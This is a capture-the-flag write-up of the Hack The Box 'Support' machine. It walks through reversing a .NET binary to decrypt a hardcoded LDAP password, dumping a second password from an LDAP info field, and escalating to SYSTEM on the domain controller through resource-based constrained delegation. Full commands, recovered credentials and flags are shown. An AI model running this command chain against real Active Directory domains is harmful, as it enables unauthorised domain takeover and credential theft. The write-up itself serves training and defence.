# HTB Support — Full Writeup

**Platform:** Hack The Box  
**Difficulty:** Easy  
**OS:** Windows  
**Category:** Active Directory  
**Author:** nt0wl  

---

## Table of Contents

1. [Overview](#overview)
2. [Enumeration](#enumeration)
   - [Port Scan](#port-scan)
   - [SMB Enumeration](#smb-enumeration)
3. [Exploitation — .NET Reversing](#exploitation--net-reversing)
   - [Recovering the Binary](#recovering-the-binary)
   - [Decompiling with ilspycmd](#decompiling-with-ilspycmd)
   - [Decrypting the Hardcoded Password](#decrypting-the-hardcoded-password)
4. [LDAP Enumeration](#ldap-enumeration)
   - [Validating Credentials](#validating-credentials)
   - [Enumerating Users and Groups](#enumerating-users-and-groups)
   - [Finding the Password in the info Field](#finding-the-password-in-the-info-field)
5. [Foothold — WinRM](#foothold--winrm)
6. [Privilege Escalation — RBCD](#privilege-escalation--rbcd)
   - [Understanding the Attack Path](#understanding-the-attack-path)
   - [Step 1: Create a Fake Computer Account](#step-1-create-a-fake-computer-account)
   - [Step 2: Configure RBCD on the DC](#step-2-configure-rbcd-on-the-dc)
   - [Step 3: Request a Service Ticket via S4U2Proxy](#step-3-request-a-service-ticket-via-s4u2proxy)
   - [Step 4: psexec as SYSTEM](#step-4-psexec-as-system)
7. [Flags](#flags)
8. [Key Takeaways](#key-takeaways)
9. [Tools Used](#tools-used)
10. [MITRE ATT&CK Mapping](#mitre-attck-mapping)

---

## Overview

Support is an Easy-rated Windows Active Directory machine that chains together several real-world attack techniques: SMB share enumeration, .NET binary reversing, LDAP credential abuse, and a Resource-Based Constrained Delegation (RBCD) privilege escalation to Domain Admin. Despite its Easy rating, the box covers techniques commonly seen in real internal penetration tests and provides excellent foundational AD knowledge.

**Attack Chain Summary:**

```
SMB enum → UserInfo.exe → ilspycmd decompile → XOR decrypt LDAP creds
→ ldapsearch → password in info field → evil-winrm foothold
→ SeMachineAccountPrivilege → RBCD → S4U2Proxy → SYSTEM
```

---

## Enumeration

### Port Scan

```bash
nmap -sCV -Pn -p- --min-rate 5000 -oA nmap/Support 10.129.230.181
```

**Results:**

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf        .NET Message Framing
```

The port profile is a classic Windows Domain Controller: DNS (53), Kerberos (88), LDAP (389/3268), SMB (445), and WinRM (5985). The LDAP banner leaks the domain name `support.htb`.

Add to `/etc/hosts`:
```
10.129.230.181  support.htb dc.support.htb
```

---

### SMB Enumeration

With the DC identified, the first step is enumerating SMB shares for any exposed content.

```bash
nxc smb 10.129.230.181 --shares
```

Or with null session:
```bash
smbclient -L //10.129.230.181 -N
```

A non-standard share is found alongside the default Windows shares (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`). Connect and list its contents:

```bash
smbclient //10.129.230.181/<share> -N
smb: \> ls
smb: \> get UserInfo.exe
```

`UserInfo.exe` is the interesting artifact — a custom .NET application that stands out immediately.

---

## Exploitation — .NET Reversing

### Recovering the Binary

The binary is pulled directly from the SMB share using `smbclient`. It is a .NET Framework 4.8 application based on the assembly metadata recovered during decompilation.

### Decompiling with ilspycmd

.NET binaries compile to Intermediate Language (IL) rather than native machine code. IL retains high-level structure — class names, method names, string literals — which means decompilers like ILSpy can reconstruct near-identical source code from the compiled binary.

Install `ilspycmd` via the .NET SDK:

```bash
# Install .NET SDK
wget https://dot.net/v1/dotnet-install.sh
chmod +x dotnet-install.sh
sudo ./dotnet-install.sh --channel 10.0 --install-dir /usr/share/dotnet

# Add to PATH
export PATH=$PATH:/usr/share/dotnet
echo 'export PATH=$PATH:/usr/share/dotnet' >> ~/.zshrc

# Install ilspycmd
dotnet tool install ilspycmd -g
export PATH="$PATH:/home/nt0wl/.dotnet/tools"
echo 'export PATH="$PATH:/home/nt0wl/.dotnet/tools"' >> ~/.zshrc
```

Decompile the binary:

```bash
ilspycmd UserInfo.exe
```

The output is effectively the original C# source. Inside `UserInfo.Services`, the `Protected` class stands out immediately:

```csharp
internal class Protected
{
    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
    private static byte[] key = Encoding.ASCII.GetBytes("armando");

    public static string getPassword()
    {
        byte[] array = Convert.FromBase64String(enc_password);
        byte[] array2 = array;
        for (int i = 0; i < array.Length; i++)
        {
            array2[i] = (byte)(array[i] ^ key[i % key.Length] ^ 0xDF);
        }
        return Encoding.Default.GetString(array2);
    }
}
```

The `LdapQuery` class uses this password to authenticate against `support.htb` as `support\ldap`:

```csharp
string password = Protected.getPassword();
entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
```

This is a **hardcoded credential** vulnerability (CWE-259). The developer attempted to obfuscate the password with a simple XOR routine, but both the ciphertext and the key are stored in the same binary — making it trivially reversible.

---

### Decrypting the Hardcoded Password

The decryption algorithm:
1. Base64-decode the ciphertext
2. XOR each byte with the cycling key `"armando"`
3. XOR each byte with the static value `0xDF`

Replicate in Python:

```python
import base64

enc = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"
data = base64.b64decode(enc)
result = bytes([b ^ key[i % len(key)] ^ 0xDF for i, b in enumerate(data)])
print(result.decode())
```

**Output:**
```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Credentials recovered: `support\ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

---

## LDAP Enumeration

### Validating Credentials

Before enumerating, confirm the credentials are valid:

```bash
nxc smb 10.129.230.181 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d 'support.htb'
nxc ldap 10.129.230.181 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d 'support.htb'
```

Both return `[+]` — credentials confirmed valid.

---

### Enumerating Users and Groups

With valid LDAP credentials, enumerate all domain users:

```bash
ldapsearch -x -H ldap://10.129.230.181 \
  -D 'support\ldap' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' \
  '(objectClass=user)' sAMAccountName
```

Check the `Remote Management Users` group membership (WinRM access = `evil-winrm`):

```bash
ldapsearch -x -H ldap://10.129.230.181 \
  -D 'support\ldap' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' \
  '(cn=Remote Management Users)' member
```

The `support` user is confirmed as a member.

**`ldapsearch` syntax reference:**

| Flag | Purpose |
|------|---------|
| `-x` | Simple auth (use password directly, no SASL) |
| `-H` | LDAP server URI (`ldap://` or `ldaps://`) |
| `-D` | Bind DN — the account authenticating |
| `-w` | Password in plaintext |
| `-b` | Base DN — root of the search scope |
| `'(filter)'` | LDAP filter for matching objects |
| `attribute` | Specific attributes to return (omit = all) |

---

### Finding the Password in the info Field

Dump all attributes for the `support` user:

```bash
ldapsearch -x -H ldap://10.129.230.181 \
  -D 'support\ldap' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' \
  '(sAMAccountName=support)'
```

Key output:

```
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
```

A plaintext password has been stored in the `info` field — a non-standard LDAP attribute commonly abused by administrators to note passwords or account details. This is another hardcoded credential finding.

Credentials recovered: `support\support : Ironside47pleasure40Watchful`

> **Real-world note:** Always check `info`, `comment`, `description`, and `extensionAttribute*` fields on every interesting user. These are common places administrators store passwords in AD.

---

## Foothold — WinRM

The `support` user is in `Remote Management Users`, meaning WinRM (port 5985) is accessible. Use `evil-winrm` to get an interactive shell:

```bash
evil-winrm -i 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful'
```

Verify access and enumerate privileges:

```powershell
whoami /all
```

Key findings from the output:

```
User: support\support

Privilege Name                Description
============================= ==============================
SeMachineAccountPrivilege     Add workstations to domain    ← key privilege
SeChangeNotifyPrivilege       Bypass traverse checking
SeIncreaseWorkingSetPrivilege Increase a process working set

Group: SUPPORT\Shared Support Accounts
Group: BUILTIN\Remote Management Users
```

`SeMachineAccountPrivilege` allows the `support` user to add computer accounts to the domain (up to the default quota of 10). This, combined with being on the DC itself, opens the door to a Resource-Based Constrained Delegation (RBCD) attack.

Grab the user flag:

```powershell
type C:\Users\support\Desktop\user.txt
```

---

## Privilege Escalation — RBCD

### Understanding the Attack Path

**Resource-Based Constrained Delegation** is a Kerberos feature where the *target* resource (the DC) specifies which accounts are trusted to impersonate users to it — stored in the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

The attack requires:
1. The ability to create a computer account (`SeMachineAccountPrivilege`) ✅
2. Write access to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the DC object (the `support` user has this via group membership) ✅

**S4U Extension Flow:**
- **S4U2Self** — allows a service to obtain a ticket to *itself* on behalf of any user
- **S4U2Proxy** — allows a service to use that ticket to obtain a service ticket *to another service* on behalf of that user
- Combined: `FAKE$` → obtains a ticket as Administrator → presents it to CIFS on the DC → full access

---

### Step 1: Create a Fake Computer Account

```bash
impacket-addcomputer 'support.htb/support:Ironside47pleasure40Watchful' \
  -computer-name 'FAKE$' \
  -computer-pass 'Password123!'
```

A new computer account `FAKE$` is created with a known password. Computer accounts are security principals that can request Kerberos tickets.

---

### Step 2: Configure RBCD on the DC

Use `bloodyAD` to write the delegation attribute on the DC object, granting `FAKE$` the right to impersonate users:

```bash
bloodyAD --host 10.129.230.181 -d support.htb \
  -u support -p 'Ironside47pleasure40Watchful' \
  add rbcd DC$ FAKE$
```

Output confirms:
```
[+] FAKE$ can now impersonate users on DC$ via S4U2Proxy
```

This writes to `msDS-AllowedToActOnBehalfOfOtherIdentity` on the DC object, telling Kerberos: *"Trust FAKE$ to impersonate any user when requesting services on DC$."*

---

### Step 3: Request a Service Ticket via S4U2Proxy

Use `impacket-getST` to perform the full S4U chain and obtain a CIFS service ticket for `Administrator`:

```bash
impacket-getST \
  -spn 'cifs/dc.support.htb' \
  -impersonate Administrator \
  'support.htb/FAKE$:Password123!'
```

The ticket is saved as:
```
Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

Load the ticket into the environment:

```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

---

### Step 4: psexec as SYSTEM

With the Administrator Kerberos ticket loaded, use `impacket-psexec` with Kerberos authentication. The hostname must resolve — ensure `dc.support.htb` is in `/etc/hosts`:

```bash
sudo sh -c 'echo "10.129.230.181 dc.support.htb" >> /etc/hosts'
```

```bash
impacket-psexec -k -no-pass dc.support.htb
```

Shell lands as `NT AUTHORITY\SYSTEM`.

```
Microsoft Windows [Version 10.0.20348.859]
C:\Windows\system32>
```

---

## Flags

```
User flag:  eb2969229096713964fffbabac1e1393
Root flag:  3a5db0248eabccdf4f1b139b2fc746aa
```

---

## Key Takeaways

**1. .NET binaries are trivially reversible**  
IL retains high-level structure. `ilspycmd` or `dnSpy` produces near-original source code. Any hardcoded credential, API key, or encryption routine in a .NET binary should be considered exposed. Document as CWE-259.

**2. LDAP non-standard fields are goldmines**  
The `info`, `comment`, `description`, and `extensionAttribute*` fields are not access-controlled the same way as `userPassword`. Administrators routinely store passwords in these fields. Always dump them on every interesting user.

**3. `SeMachineAccountPrivilege` is a privesc primitive**  
Any domain user with this privilege and write access to a computer object's delegation attribute can perform RBCD. It's commonly overlooked in assessments.

**4. RBCD is about the target, not the source**  
Traditional constrained delegation trusts the *source* service. RBCD flips it — the *target* says who it trusts. This means any write to `msDS-AllowedToActOnBehalfOfOtherIdentity` is a critical finding.

**5. Kerberos requires hostname resolution**  
`impacket-psexec -k` will fail with an IP. The ticket is issued for `dc.support.htb` — the hostname must resolve. Always add DC hostnames to `/etc/hosts` before Kerberos-based attacks.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `nxc` (NetExec) | SMB/LDAP credential validation and share enumeration |
| `smbclient` | SMB share browsing and file download |
| `ilspycmd` | .NET binary decompilation |
| `ldapsearch` | LDAP enumeration and attribute inspection |
| `evil-winrm` | WinRM shell access |
| `impacket-addcomputer` | Creating fake computer account |
| `bloodyAD` | Writing RBCD delegation attribute |
| `impacket-getST` | S4U2Self + S4U2Proxy ticket request |
| `impacket-psexec` | SYSTEM shell via Kerberos ticket |

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Network Share Discovery | T1135 | Enumerated SMB shares |
| Credentials in Files | T1552.001 | Hardcoded LDAP password in binary |
| Deobfuscate/Decode Files | T1140 | XOR decryption of password |
| LDAP Query | T1069.002 | Enumerated domain groups via LDAP |
| Account Discovery | T1087.002 | Enumerated domain users via LDAP |
| Valid Accounts | T1078.002 | Used ldap and support domain accounts |
| Remote Services: WinRM | T1021.006 | Foothold via evil-winrm |
| Create Account: Domain Account | T1136.002 | Created FAKE$ computer account |
| Resource-Based Constrained Delegation | T1134.001 | RBCD via msDS-AllowedToActOnBehalfOfOtherIdentity |
| Use Alternate Authentication Material | T1550.003 | Kerberos ccache ticket for psexec |

---

*Written by nt0wl — [9t0wl.github.io](https://9t0wl.github.io)*
